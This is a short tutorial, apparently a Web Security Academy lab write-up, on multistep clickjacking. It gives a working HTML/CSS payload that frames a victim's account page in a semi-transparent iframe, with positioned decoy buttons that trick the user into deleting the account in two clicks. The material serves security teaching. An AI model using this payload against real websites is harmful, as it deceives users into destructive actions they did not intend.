Attacker manipulation of inputs to a target website may necessitate multiple actions. For example, an attacker might want to trick a user into buying something from a retail website so items need to be added to a shopping basket before the order is placed. These actions can be implemented by the attacker using multiple divisions or iframes. Such attacks require considerable precision and care from the attacker perspective if they are to be effective and stealthy.

Example: In this case, we want to perform the action of deleting a victim account, but, it has two steps to complete this action, so, we have to add to buttons to achieve our goal. To have different buttons we add the class attribute in our div flag to set a name to that attribute and be able to set the position in CSS. Check the example:


<style> 
       iframe { 
              position:relative; 
              width:1024px; 
              height: 860px; 
              opacity: 0.5; 
               z-index: 2; } 
        .firstClick {
		position:absolute;
		top:510;
		left:45;
		z-index: 1;
	}
   .secondClick {
		position:absolute;
		top:315;
		left:220;
	        z-index: 1;
	}
</style> 
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a9900860490733481658e770042004b.web-security-academy.net/my-account"></iframe>